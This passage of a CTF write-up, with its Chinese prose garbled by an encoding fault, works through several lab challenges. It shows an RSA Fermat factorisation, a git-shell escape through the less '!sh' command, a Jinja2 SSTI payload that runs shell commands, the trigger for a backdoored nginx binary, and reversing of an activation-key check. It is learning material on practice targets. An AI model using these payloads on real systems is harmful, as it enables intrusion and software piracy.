<span class="pl-s1">offset</span> <span class="pl-c1">=</span> <span class="pl-s1">random</span>.<span class="pl-c1">randint</span>(<span class="pl-c1">1000</span>, <span class="pl-s1">close_offset_max</span>)		<span class="pl-c"># ç”Ÿæˆä¸€ä¸ªåç§»é‡ï¼Œåœ¨ 1000 ~ 2^20 ä¹‹é—´</span>
<span class="pl-s1">q</span> <span class="pl-c1">=</span> <span class="pl-en">next_prime</span>(<span class="pl-s1">p</span> <span class="pl-c1">+</span> <span class="pl-s1">offset</span>)							<span class="pl-c"># p åŠ ä¸Šåç§»é‡åè°ƒæ•´ç”Ÿæˆç´ æ•° q</span>
<span class="pl-k">if</span> <span class="pl-s1">p</span> <span class="pl-c1">==</span> <span class="pl-s1">q</span>:
    <span class="pl-k">continue</span>

<span class="pl-s1">n</span> <span class="pl-c1">=</span> <span class="pl-s1">p</span> <span class="pl-c1">*</span> <span class="pl-s1">q</span></pre></div>
<p>ä¹Ÿå°±æ˜¯è¯´ <code class="notranslate">p,q</code> çš„ä½æ•°å¤§è‡´å›ºå®šï¼Œä¸” <code class="notranslate">q - p</code> å·®å€¼æ¯”è¾ƒå°ï¼Œè€ƒè™‘ä½¿ç”¨ Fermat è´¨æ•°åˆ†è§£ç®—æ³•ï¼š</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">def</span> <span class="pl-en">fermat_factorization</span>(<span class="pl-s1">n</span>):
    <span class="pl-s1">a</span> <span class="pl-c1">=</span> <span class="pl-s1">gmpy2</span>.<span class="pl-c1">isqrt</span>(<span class="pl-s1">n</span>)
    <span class="pl-k">while</span> <span class="pl-c1">True</span>:
        <span class="pl-s1">b2</span> <span class="pl-c1">=</span> <span class="pl-s1">a</span> <span class="pl-c1">*</span> <span class="pl-s1">a</span> <span class="pl-c1">-</span> <span class="pl-s1">n</span>
        <span class="pl-k">if</span> <span class="pl-s1">gmpy2</span>.<span class="pl-c1">is_square</span>(<span class="pl-s1">b2</span>):
            <span class="pl-s1">b</span> <span class="pl-c1">=</span> <span class="pl-s1">gmpy2</span>.<span class="pl-c1">isqrt</span>(<span class="pl-s1">b2</span>)
            <span class="pl-s1">p</span> <span class="pl-c1">=</span> <span class="pl-s1">a</span> <span class="pl-c1">-</span> <span class="pl-s1">b</span>
            <span class="pl-s1">q</span> <span class="pl-c1">=</span> <span class="pl-s1">a</span> <span class="pl-c1">+</span> <span class="pl-s1">b</span>
            <span class="pl-k">return</span> <span class="pl-en">int</span>(<span class="pl-s1">p</span>), <span class="pl-en">int</span>(<span class="pl-s1">q</span>)
        <span class="pl-s1">a</span> <span class="pl-c1">+=</span> <span class="pl-c1">1</span></pre></div>
<p>å¸¦å…¥åˆ°å…·ä½“æ•°æ®è·‘ä¸€éç¨‹åºå°±å¯ä»¥æ‹¿åˆ° Flagï¼š<code class="notranslate">flag{RSA_is_weak_when_p_approx_q}</code>ï¼ŒFlag è¯´å¾—å¯¹</p>
<hr>
<p>PWN é¢˜æˆ‘éƒ½ä¸ä¼šå†™ï¼Œå¯¹ä¸èµ·å‡ºé¢˜è€…ğŸ˜­</p>
<hr>
<h3>Web01-é€ƒç¦»</h3>
<blockquote>
<p>åœ¨ä¸€æ¬¡æ¸—é€æµ‹è¯•ä¸­ï¼Œä½ é€šè¿‡ä¸€ä¸ªæ–‡ä»¶è¯»å–æ¼æ´å¾—åˆ°äº†ç”¨æˆ·å git çš„ SSH ç§é’¥<br>
ä½¿ç”¨ç»™å®šçš„ SSH ç§é’¥å’Œç”¨æˆ·å git ç™»å½•æŒ‡å®šçš„åœ°å€ï¼Œä» Gitshell é‡Œé€ƒç¦»</p>
<p>flag åœ¨ /home/git ä¸‹</p>
</blockquote>
<p>ç›®æ ‡æ˜¯ä»é«˜åº¦å—é™çš„ Gitshell ç¯å¢ƒä¸­æƒ³åŠæ³•æ¥åˆ°æ™®é€š Shell ç¯å¢ƒä¸­ï¼Œè¯»å– <code class="notranslate">/home/git</code> çš„å†…å®¹</p>
<p>å…ˆç”¨ SSH è¯•æ¢ä¸€ä¸‹ï¼ˆ<code class="notranslate">id_rsa</code> æ˜¯ä¸‹å‘çš„ç§é’¥æ–‡ä»¶ï¼‰ï¼š</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">&gt;</span>ssh -i id_rsa git@xxx.xxx.xxx.xx -p 12345
fatal: unrecognized <span class="pl-c1">command</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
Connection to xxx.xxx.xxx.xx closed.</pre></div>
<p>åé€äº†ï¼Œè¿™ä¸ª Git æœåŠ¡å™¨ä¸å…è®¸äº¤äº’å¼è¾“å…¥æŒ‡ä»¤ï¼Œæˆ‘åªèƒ½åœ¨ SSH è¯·æ±‚æ—¶é™„å¸¦æˆ‘çš„æŒ‡ä»¤ï¼š</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">&gt;</span>ssh -i id_rsa git@xxx.xxx.xxx.xx -p 12345 <span class="pl-s"><span class="pl-pds">"</span>help<span class="pl-pds">"</span></span>
fatal: unrecognized <span class="pl-c1">command</span> <span class="pl-s"><span class="pl-pds">'</span>help<span class="pl-pds">'</span></span></pre></div>
<p><code class="notranslate">help</code> éƒ½ä¸èƒ½ç”¨ï¼Ÿç»è¿‡æµ‹è¯•å’ŒæŸ¥è¯¢ï¼Œåªæœ‰ <code class="notranslate">git receive-pack</code> <code class="notranslate">git upload-pack</code> <code class="notranslate">git upload-archive</code> å¯ä»¥ä½¿ç”¨ï¼Œé‚£å°±æ‰¾ä¸ªä»“åº“ä¸Šä¼ äº›ä»€ä¹ˆä¸œè¥¿åšä¸ªæ‰‹è„šï¼š</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">&gt;</span>ssh -i id_rsa git@xxx.xxx.xxx.xx -p 12345 <span class="pl-s"><span class="pl-pds">"</span>git upload-pack '/home/git'<span class="pl-pds">"</span></span>
fatal: <span class="pl-s"><span class="pl-pds">'</span>/home/git<span class="pl-pds">'</span></span> does not appear to be a git repository</pre></div>
<p>åˆç»è¿‡æµ‹è¯•ï¼Œè¿™ä¸ªç¯å¢ƒé‡Œé¢æ²¡æœ‰ git ä»“åº“ï¼ˆè‡³å°‘æˆ‘æ²¡æ‰¾åˆ°ï¼‰ï¼Œæˆ‘å†³å®š <code class="notranslate">--help</code> ä¸€ä¸‹</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">&gt;</span>ssh -i id_rsa git@xxx.xxx.xxx.xx -p 12345 <span class="pl-s"><span class="pl-pds">"</span>git upload-pack '--help'<span class="pl-pds">"</span></span>
GIT-UPLOAD-PACK(1)                Git Manual                GIT-UPLOAD-PACK(1)

NAME
       git-upload-pack - Send objects packed back to git-fetch-pack

SYNOPSIS
       git-upload-pack [--[no-]strict] [--timeout<span class="pl-k">=&lt;</span>n<span class="pl-k">&gt;</span>] [--stateless-rpc]
                         [--advertise-refs] <span class="pl-k">&lt;</span>directory<span class="pl-k">&gt;</span>
       DESCRIPTION

       <span class="pl-c"><span class="pl-c">#</span> ... å¤ªå¤šäº†ä¸è´´äº†</span>

SEE ALSO
       gitnamespaces(7)

GIT
       Part of the git(1) suite

Git 2.12.2                        12/25/2020                GIT-UPLOAD-PACK(1)
<span class="pl-k">&gt;</span> <span class="pl-c"><span class="pl-c">#</span> ç›´æ¥é€€å‡º SSH è¿æ¥äº†</span></pre></div>
<p><del>è¿™æ˜¯æˆ‘ç›®å‰æˆåŠŸè¿è¡Œçš„å”¯ä¸€ä¸€æ¡æŒ‡ä»¤</del>ï¼Œè¾“å‡ºé¡µé¢è®©æˆ‘æƒ³åˆ°äº† <code class="notranslate">man</code> æŒ‡ä»¤ï¼Œå°è±¡é‡Œå¸®åŠ©é¡µé¢åº”è¯¥ç”¨ <code class="notranslate">less</code> åˆ†é¡µå™¨æ‰“å¼€ï¼Œè€Œ <code class="notranslate">less</code> åˆ†é¡µå™¨ æœ‰ <code class="notranslate">!sh</code> çš„æ“ä½œå¯ä»¥æ‰“å¼€å­ <code class="notranslate">shell</code> å®ç°é€ƒé€¸ã€‚æŸ¥è¯¢å¾—çŸ¥éœ€è¦åœ¨ SSH è¿æ¥æ—¶åŠ ä¸Š <code class="notranslate">-t</code> å‚æ•°å¼ºåˆ¶åˆ†é…ä¼ªç»ˆç«¯ï¼š</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">&gt;</span>ssh -t -i id_rsa git@xxx.xxx.xxx.xx -p 12345 <span class="pl-s"><span class="pl-pds">"</span>git upload-pack '--help'<span class="pl-pds">"</span></span>
<span class="pl-c"><span class="pl-c">#</span> ç”¨ less æ‰“å¼€äº†å¸®åŠ©æ–‡æ¡£ï¼Œè¾“å…¥ !sh è¿›å…¥å­ shell</span>
$ cat /home/git/flag.txt
Trinity{GIT_5HE11_byp@ss_OOOOO_060524592cce19c7}$</pre></div>
<p>è·å¾—äº† Flag <code class="notranslate">Trinity{GIT_5HE11_byp@ss_OOOOO_060524592cce19c7}</code></p>
<p><strong>Web02-é€»è¾‘é¬¼æ‰</strong> æ²¡æœ‰è¿›å±•ï¼Œä¸æ‡‚ HTTPDigestAuth :(</p>
<h3>Web03-Hello Flask!</h3>
<blockquote>
<p>æˆ‘å­¦ä¼šçš„ç¬¬ä¸€è¡Œä»£ç å°±æ˜¯<code class="notranslate">cout&lt;&lt;"Hello Flask!"&lt;&lt;endl;</code></p>
<p>flag åœ¨ /etc/flag.txt</p>
<p>è®¿é—®ï¼š<code class="notranslate">http://ip:port/?name=123</code></p>
</blockquote>
<p>å…ˆæŒ‰ç…§ä»–è¯´çš„è®¿é—®ä¸€ä¸‹ <code class="notranslate">http://ip:port/?name=123</code>ï¼ŒHTML é¡µé¢åªæœ‰ä¸€å¥ <em>Hello 123</em></p>
<p>STFW äº†è§£åˆ° Flask æ˜¯ Python çš„ Web æ¡†æ¶ï¼Œä½¿ç”¨ Jinja æ¨¡æ¿å¼•æ“ï¼Œåˆä¸å°å¿ƒæœåˆ°äº† [<a href="https://hello-ctf.com/hc-web/ssti/" rel="nofollow">SSTIæ³¨å…¥ - Hello CTF</a>](<a href="https://hello-ctf.com/hc-web/ssti/" rel="nofollow">https://hello-ctf.com/hc-web/ssti/</a>) äº†è§£äº†ä¸€ä¸‹</p>
<blockquote>
<p><em>ä¸€èˆ¬æˆ‘ä»¬ä¼šåœ¨ç–‘ä¼¼çš„åœ°æ–¹å°è¯•æ’å…¥ç®€å•çš„æ¨¡æ¿è¡¨è¾¾å¼ï¼Œå¦‚ <code class="notranslate">{{7*7}}</code> <code class="notranslate">{{config}}</code>ï¼Œçœ‹çœ‹æ˜¯å¦èƒ½åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºé¢„æœŸç»“æœï¼Œä»¥æ­¤ç¡®å®šæ˜¯å¦æœ‰æ³¨å…¥ç‚¹ã€‚</em></p>
</blockquote>
<p>æ’å…¥ä¸€ä¸‹è¯•è¯•ï¼š <code class="notranslate">http://ip:port/?name={{7*7}}</code>ï¼ŒHTML é¡µé¢è¾“å‡º <em>Hello 49</em>ï¼Œçœ‹æ¥æœ‰æ³¨å…¥ç‚¹</p>
<p>ç»è¿‡å’Œ AI çš„åå¤ä¿®æ”¹åå¾—åˆ°äº†ä¸‹é¢çš„æ¨¡æ¿ï¼š</p>
<div class="highlight highlight-source-python"><pre class="notranslate">{{<span class="pl-s1">cycler</span>.<span class="pl-c1">__init__</span>.<span class="pl-c1">__globals__</span>.<span class="pl-c1">__builtins__</span>.<span class="pl-c1">__import__</span>(<span class="pl-s">'os'</span>).<span class="pl-c1">popen</span>(<span class="pl-s">'cat /etc/flag.txt'</span>).<span class="pl-c1">read</span>()}}
<span class="pl-c"># ä» cycler å¯¹è±¡å¼€å§‹ï¼ˆJinja2æ¨¡æ¿çš„é»˜è®¤å¯¹è±¡ï¼‰ï¼Œé€šè¿‡ __init__ è·å–åˆå§‹åŒ–æ–¹æ³•ï¼Œ __globals__ è·å–å…¨å±€å‘½åç©ºé—´ï¼Œ __builtins__ è·å–å†…ç½®å‡½æ•°ï¼Œ __import__('os') å¯¼å…¥osæ¨¡å—ï¼Œæœ€ç»ˆè°ƒç”¨ popen() æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œread() è¿›è¡Œè¯»å–ï¼Œè¾“å‡ºåœ¨ HTML é¡µé¢ä¸Š</span></pre></div>
<p>å¾—åˆ° Flag <code class="notranslate">Trinity{ssti_is_Funnnnnny!422144319e480db2}</code></p>
<hr>
<h3>RE01-å¸¦åé—¨çš„nginx</h3>
<blockquote>
<p><strong>æè¿°ï¼š</strong> xxå¤§å­¦è¿‘æ—¥é­å—ä¸€èµ· APT æ”»å‡»ï¼šé»‘å®¢ç»„ç»‡é€šè¿‡è´­ä¹°æœç´¢å¼•æ“æ¨å¹¿ï¼Œå°†å…¶ç²¾å¿ƒä¼ªé€ çš„ nginx å®˜ç½‘ç½®äºæœç´¢ç»“æœé¦–ä½ã€‚æŸè¿ç»´äººå‘˜å› è€Œä¸‹è½½äº†è¯¥ç½‘ç«™ä¸Šè¢«æ¤å…¥åé—¨çš„ nginxã€‚æœåŠ¡ä¸Šçº¿åï¼Œé»‘å®¢ç»„ç»‡é€šè¿‡è¯¥åé—¨é•¿æœŸéšè”½åœ°ä»å†…ç½‘ç›—å–ä¿¡æ¯ã€‚ä½ çš„ä»»åŠ¡æ˜¯é€šè¿‡é€†å‘å·¥ç¨‹æ‰¾åˆ°è¯¥åé—¨çš„è®¿é—®æ–¹å¼ï¼Œå¹¶å¤ç°è¯¥åé—¨æ¥è¯»å–æœåŠ¡åå°çš„ flagã€‚</p>
<p>è¯¥åé—¨ä¸ºå‘½ä»¤æ‰§è¡Œåé—¨ï¼Œå¹¶è¢«ç¬¦åˆè¦æ±‚çš„ HTTP è¯·æ±‚è§¦å‘ã€‚æ‰¾åˆ°è§¦å‘æ–¹å¼åï¼Œä½ å¯ä»¥æ„é€ ä»»æ„å‘½ä»¤ã€‚</p>
<p>è¯»å– flag å¯ä»¥ä½¿ç”¨åå¼¹ shellï¼Œä¹Ÿå¯ä»¥æŠŠ flag æ–‡ä»¶æ‹·è´åˆ°ç½‘ç«™æ ¹ç›®å½•ã€‚å…¶ä¸­ flag ä½äº /flagï¼Œnginx ç½‘ç«™ä½äº /nginx/htmlã€‚</p>
</blockquote>
<p>ä¸‹å‘äº†ä¸€ä¸ª <code class="notranslate">nginx</code> æ–‡ä»¶ï¼Œä½¿ç”¨ DIE æ£€æµ‹ä¸º <code class="notranslate">ELF64</code> ï¼Œä½¿ç”¨ Ghidra è¿›è¡Œé€†å‘ï¼Œåˆ†æé€†å‘å†…å®¹ã€‚</p>
<p>å› ä¸ºæˆ‘ä¸ç†Ÿæ‚‰ nginx åç¼–è¯‘åçš„å†…å®¹ï¼Œå¶ç„¶æœç´¢äº†ä¸€ä¸‹å« "flag" çš„å­—ç¬¦ä¸²</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/58e5cd89a559f57cb39de435c62a130a979dc6b0288f0b5a9980bbcb829b11e0/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363138333235353235342e706e67"><img src="https://camo.githubusercontent.com/58e5cd89a559f57cb39de435c62a130a979dc6b0288f0b5a9980bbcb829b11e0/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363138333235353235342e706e67" alt="image-20251006183255254" data-canonical-src="https://nopthon.github.io/image-20251006183255254.png" style="max-width: 100%;"></a></p>
<p>æ‰¾åˆ°äº†è¿™ä¸ªæœ‰è¶£çš„å†…å®¹ï¼š</p>
<div class="highlight highlight-source-assembly"><pre class="notranslate"><span class="pl-en">                             s_This_is_a_fake_flag!_001b8f5c                 XREF</span><span class="pl-s1">[</span><span class="pl-c1">3</span><span class="pl-s1">]</span><span class="pl-en">:     ngx_http_static_handler:0018a078</span>
<span class="pl-en">                                                                                         ngx_http_static_handler:0018a087</span>
<span class="pl-en">                                                                                          001dd540 (</span><span class="pl-s1">*</span><span class="pl-en">)   </span>
<span class="pl-en">        001b8f5c </span><span class="pl-c1">54</span><span class="pl-en">  </span><span class="pl-c1">68</span><span class="pl-en">  </span><span class="pl-c1">69</span><span class="pl-en">       </span><span class="pl-v">ds</span><span class="pl-en">         </span><span class="pl-s">"This_is_a_fake_flag!"</span>
<span class="pl-en">                 </span><span class="pl-c1">73</span><span class="pl-en">  5f  </span><span class="pl-c1">69</span><span class="pl-en"> </span>
<span class="pl-en">                 </span><span class="pl-c1">73</span><span class="pl-en">  5f  </span><span class="pl-c1">61</span><span class="pl-en"> </span>
</pre></div>
<p>æˆ‘ç›¸ä¿¡å‡ flag ä¸å¯èƒ½ä¸€ç‚¹ç”¨éƒ½æ²¡æœ‰ï¼Œäºæ˜¯å®šä½åˆ°è°ƒç”¨äº†è¿™éƒ¨åˆ†å­—ç¬¦ä¸²çš„å‡½æ•° <code class="notranslate">ngx_http_static_handler</code>ï¼Œä¸‹é¢æˆªå–äº†æœ‰ç”¨çš„å†…å®¹ï¼š</p>
<div class="highlight highlight-source-c++"><pre class="notranslate">__s = g_flag;	<span class="pl-c"><span class="pl-c">//</span> g_flag çš„å†…å®¹å°±æ˜¯ "This_is_a_fake_flag!"</span>

<span class="pl-c"><span class="pl-c">//</span> å°† password ç¡¬ç¼–ç ä¸ºç¥ç§˜å€¼ï¼Œç„¶åä¸ g_flag è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼ˆè§£å¯†ï¼‰å¾—åˆ°æ–°çš„ password</span>
<span class="pl-en">builtin_memcpy</span>(password,<span class="pl-s"><span class="pl-pds">"</span>#1<span class="pl-cce">\x03\x17</span>.<span class="pl-cce">\x10\n\x135</span>/<span class="pl-cce">\x16</span>$<span class="pl-cce">\r</span>6&lt;<span class="pl-cce">\x0e</span> ,<span class="pl-cce">\x13F</span><span class="pl-pds">"</span></span>,<span class="pl-c1">0x14</span>);
<span class="pl-k">for</span> (uVar16 = <span class="pl-c1">0</span>; <span class="pl-smi">sVar4</span> = strlen(__s), uVar16 &lt; <span class="pl-smi">sVar4</span>; uVar16 = uVar16 + <span class="pl-c1">1</span>) {
  password[uVar16] = password[uVar16] ^ __s[uVar16];
}
nVar5 = ngx_http_arg(r,password,uVar16,&amp;arg_value);				<span class="pl-c"><span class="pl-c">//</span> ä»HTTPè¯·æ±‚ä¸­è·å– password è¿™ä¸ªå‚æ•°</span>
																<span class="pl-c"><span class="pl-c">//</span> è¿”å› 0 è¡¨ç¤ºæ‰¾åˆ°äº†è¿™ä¸ªå‚æ•°</span>
<span class="pl-k">if</span> ((nVar5 == <span class="pl-c1">0</span>) &amp;&amp; (arg_value.len - <span class="pl-c1">1</span> &lt; <span class="pl-c1">0x3ff</span>)) {
    _Var2 = <span class="pl-c1">fork</span>();
    <span class="pl-k">if</span> (_Var2 == <span class="pl-c1">0</span>) {
        <span class="pl-c"><span class="pl-c">//</span> å­è¿›ç¨‹æ‰§è¡Œ</span>
        iVar3 = <span class="pl-c1">getrlimit64</span>(RLIMIT_NOFILE,(rlimit64 *)&amp;rlim);
        <span class="pl-c"><span class="pl-c">//</span> å…³é—­æ‰€æœ‰æ–‡ä»¶æè¿°ç¬¦</span>
        <span class="pl-k">for</span> (; __fd &lt; iVar18; __fd = __fd + <span class="pl-c1">1</span>) {
            <span class="pl-c1">close</span>(__fd);
        }
        <span class="pl-c"><span class="pl-c">//</span> æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘å¯ä»¥æ„é€  http://ip:port/?password=cp /flag /nginx/html/flag.txt</span>
        <span class="pl-c"><span class="pl-c">//</span> æŠŠ flag æ–‡ä»¶æ‹·è´åˆ°ç½‘ç«™æ ¹ç›®å½•</span>
        <span class="pl-c1">execl</span>(<span class="pl-s"><span class="pl-pds">"</span>/bin/sh<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sh<span class="pl-pds">"</span></span>,&amp;DAT_001b8f1b,local_528,<span class="pl-c1">0</span>);
        <span class="pl-c1">exit</span>(<span class="pl-c1">0x7f</span>);
    }
}</pre></div>
<p>å¯¹ <code class="notranslate"> "#1\x03\x17.\x10\n\x135/\x16$\r6&lt;\x0e ,\x13F"</code> ä¸ <code class="notranslate">"This_is_a_fake_flag!"</code> è¿›è¡Œå¼‚æˆ–è§£å¯†å¾—åˆ° <code class="notranslate">password = wYjdqyyLTppEfSchLMtg</code></p>
<p>å…ˆ <code class="notranslate">http://ip:port/?wYjdqyyLTppEfSchLMtg=cp /flag /nginx/html/flag.txt</code> æŠŠ flag æ–‡ä»¶æ‹·è´åˆ°ç½‘ç«™æ ¹ç›®å½•ï¼Œç„¶å <code class="notranslate">http://ip:port/flag.txt</code> å°±èƒ½è·å¾— Flag: <code class="notranslate">flag{17a7f10e-f07c-4e3f-a080-8b91d94245b4}</code></p>
<h3>RE02-ITSCæ­£ç‰ˆOfficeæ¿€æ´»å·¥å…·</h3>
<blockquote>
<p><strong>æè¿°ï¼š</strong> è¿™æ˜¯xxå¤§å­¦ ITSC çš„ä¼šå‘˜åˆ¶ Office æ¿€æ´»å·¥å…·ï¼Œå¿…é¡»æ¯ä¸ªæœˆä¸Šäº¤ 114514 å—é’±ç½‘è´¹æ‰èƒ½è·å¾—æ¿€æ´»ç ã€‚ä½ çš„ä»»åŠ¡æ˜¯é€šè¿‡é€†å‘å·¥ç¨‹ç ´è§£è¯¥å·¥å…·ï¼Œæ‰¾åˆ°æ¿€æ´»ç çš„ç”Ÿæˆæ–¹å¼ï¼Œå¹¶ç”Ÿæˆç”¨æˆ· <code class="notranslate">itsc</code> çš„æ¿€æ´»ç ã€‚</p>
<p>è·å¾—æ¿€æ´»ç åï¼Œåœ¨å¤–é¢åŒ…è£¹ <code class="notranslate">flag{}</code> æäº¤ï¼Œå¦‚æ¿€æ´»ç æ˜¯ <code class="notranslate">0123456789abcdef</code>ï¼Œåˆ™æäº¤ <code class="notranslate">flag{0123456789abcdef}</code>ã€‚</p>
</blockquote>
<p><del>æˆ‘å·²ç»ç­‰ä¸åŠäº†ï¼Œå¿«ç‚¹ç«¯ä¸Šæ¥ç½¢</del></p>
<p>ä¸‹å‘äº†ä¸€ä¸ª <code class="notranslate">OfficeActivationTool.exe</code> å’Œä¸€å † Qt6 çš„ä¾èµ–ï¼Œä¸éœ€è¦ç”¨ DIE åˆ†æäº†</p>
<p>æ‰“å¼€ exe æ–‡ä»¶å¼¹å‡ºä¸€ä¸ªæ¿€æ´»çª—å£ï¼š</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/97616de8a58499118d175c514abd1319a938163f146284ad480db1f81256bcd2/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363138323634323538302e706e67"><img src="https://camo.githubusercontent.com/97616de8a58499118d175c514abd1319a938163f146284ad480db1f81256bcd2/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363138323634323538302e706e67" alt="image-20251006182642580" data-canonical-src="https://nopthon.github.io/image-20251006182642580.png" style="max-width: 100%;"></a></p>
<p>æ³¨æ„åˆ°æŒ‰ä¸‹æŒ‰é’®ä¹‹åå¼¹å‡º â€œæ¿€æ´»å¤±è´¥â€ çš„å›ç­”ï¼Œè€ƒè™‘è®¡ç®—æ¿€æ´»ç çš„å‡½æ•°å‡ºç°åœ¨ â€œæŒ‰ä¸‹æŒ‰é’®â€ ï¼Œç”¨ Ghidra è¿›è¡Œé€†å‘ï¼Œå…³é”®è¯ <code class="notranslate">click</code> æœç´¢</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/967f450cb79ff0157a14440da796b962c307ce7a63dfff68b9bbb68fc0a1d689/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363138323930323832372e706e67"><img src="https://camo.githubusercontent.com/967f450cb79ff0157a14440da796b962c307ce7a63dfff68b9bbb68fc0a1d689/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363138323930323832372e706e67" alt="image-20251006182902827" data-canonical-src="https://nopthon.github.io/image-20251006182902827.png" style="max-width: 100%;"></a></p>
<p>å¯¹ <code class="notranslate">on_activationButton_clicked</code> å‡½æ•°è¿›è¡Œåˆ†æï¼ŒèŠ‚é€‰äº†éƒ¨åˆ†å†…å®¹ï¼š</p>
<p>ï¼ˆQtå¯¹åº”çš„åæ±‡ç¼–å†…å®¹æ˜“è¯»æ€§ç›¸æ¯”ä¸Šä¸€é¢˜æ›´å¥½ä¸€äº›ï¼‰</p>
<div class="highlight highlight-source-c++"><pre class="notranslate"><span class="pl-c"><span class="pl-c">//</span> æ¿€æ´»ç å¿…é¡»æ˜¯32ä½åå…­è¿›åˆ¶å­—ç¬¦</span>
local_128.m_data = <span class="pl-s"><span class="pl-pds">"</span>^[0-9a-fA-F]*$<span class="pl-pds">"</span></span>;
local_128.m_size = <span class="pl-c1">0xe</span>;
<span class="pl-en">QString::fromUtf8</span>(&amp;local_68);
<span class="pl-en">QRegularExpression::QRegularExpression</span>(&amp;hexCodePattern,&amp;local_68,<span class="pl-c1">0</span>);

<span class="pl-c"><span class="pl-c">//</span> è´¦æˆ·åå¿…é¡»åªèƒ½åŒ…å«å­—æ¯/æ•°å­—/ä¸‹åˆ’çº¿ä¸”ä¸ä»¥æ•°å­—å¼€å¤´</span>
local_128.m_size = <span class="pl-c1">0x18</span>;
local_128.m_data = <span class="pl-s"><span class="pl-pds">"</span>^[_a-zA-Z][_0-9a-zA-Z]*$<span class="pl-pds">"</span></span>;
<span class="pl-en">QString::fromUtf8</span>(&amp;local_68);
<span class="pl-en">QRegularExpression::QRegularExpression</span>(&amp;accountPattern,&amp;local_68,<span class="pl-c1">0</span>);

<span class="pl-c"><span class="pl-c">//</span> æ£€æŸ¥æ¿€æ´»ç æ ¼å¼</span>
<span class="pl-k">if</span> (((cVar3 != <span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\0</span><span class="pl-pds">'</span></span>) &amp;&amp; (codeText.d.size == <span class="pl-c1">0x20</span>)) &amp;&amp; (accountText.d.size != <span class="pl-c1">0</span>)) {
    <span class="pl-c"><span class="pl-c">//</span> ä¸ºè´¦æˆ·åæ·»åŠ äº†å›ºå®šçš„åç¼€</span>
    local_130 = <span class="pl-c1">0xb</span>;
    local_138 = <span class="pl-s"><span class="pl-pds">"</span>@nju.edu.cn<span class="pl-pds">"</span></span>;
    <span class="pl-c1">QString::append</span>(&amp;accountText,&amp;local_138);					<span class="pl-c"><span class="pl-c">//</span> append</span>
    <span class="pl-c"><span class="pl-c">//</span> æ¿€æ´»ç åå…­è¿›åˆ¶è½¬å­—èŠ‚æ•°ç»„</span>
    <span class="pl-c1">QString::toUtf8_helper</span>(&amp;local_88);							<span class="pl-c"><span class="pl-c">//</span> to utf8</span>
    <span class="pl-c1">QByteArray::fromHex</span>((QByteArray *)&amp;local_68);				<span class="pl-c"><span class="pl-c">//</span> from hex</span>
    <span class="pl-c"><span class="pl-c">//</span> å¯¹æ·»åŠ åç¼€ä¹‹åçš„è´¦æˆ·åè¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼ŒQtçš„å“ˆå¸ŒåŠ å¯†é»˜è®¤ä¸º md5</span>
    <span class="pl-c1">QString::toUtf8_helper</span>(&amp;local_88);
    local_128.<span class="pl-smi">m_size</span> = local_88.<span class="pl-smi">d</span>.<span class="pl-smi">size</span>;
    local_128.<span class="pl-smi">m_data</span> = (storage_type *)local_88.<span class="pl-smi">d</span>.<span class="pl-smi">ptr</span>;
    <span class="pl-c1">QCryptographicHash::hash</span>(&amp;local_68,(Algorithm)&amp;local_128);	<span class="pl-c"><span class="pl-c">//</span> hash</span>
    <span class="pl-c"><span class="pl-c">//</span> æ¯”è¾ƒå“ˆå¸Œç»“æœä¸æ¿€æ´»ç </span>
    local_128.<span class="pl-smi">m_data</span> = local_68.<span class="pl-smi">m_data</span>;
    local_128.<span class="pl-smi">m_size</span> = local_58;
    local_148.<span class="pl-smi">m_size</span> = qVar2;
    local_148.<span class="pl-smi">m_data</span> = psVar1;
    iVar4 = <span class="pl-c1">QtPrivate::compareMemory</span>(&amp;local_128,&amp;local_148);	<span class="pl-c"><span class="pl-c">//</span> compareMemory</span>
    <span class="pl-k">if</span> (iVar4 == <span class="pl-c1">0</span>) {
        pQVar5 = *(QString **)(<span class="pl-c1">this</span>-&gt;<span class="pl-smi">ui</span> + <span class="pl-c1">0x58</span>);
        <span class="pl-c1">QString::QString</span>((QString *)&amp;local_68,(QChar *)&amp;DAT_140006196,<span class="pl-c1">4</span>); <span class="pl-c"><span class="pl-c">//</span> "æˆåŠŸ"</span>
        <span class="pl-c1">QLabel::setText</span>(pQVar5);
        <span class="pl-c1">this</span>-&gt;<span class="pl-smi">activated</span> = <span class="pl-c1">true</span>;
    } <span class="pl-k">else</span> {
        pQVar5 = *(QString **)(<span class="pl-c1">this</span>-&gt;<span class="pl-smi">ui</span> + <span class="pl-c1">0x58</span>);
        <span class="pl-c1">QString::QString</span>((QString *)&amp;local_68,(QChar *)&amp;DAT_1400061a0,<span class="pl-c1">4</span>); <span class="pl-c"><span class="pl-c">//</span> "å¤±è´¥"</span>
        <span class="pl-c1">QLabel::setText</span>(pQVar5);
        <span class="pl-c1">this</span>-&gt;<span class="pl-smi">activated</span> = <span class="pl-c1">false</span>;
    }
}</pre></div>
<p>å†™ä¸€ä¸ª Python å‡½æ•°è®¡ç®—ä¸€ä¸‹ï¼š</p>
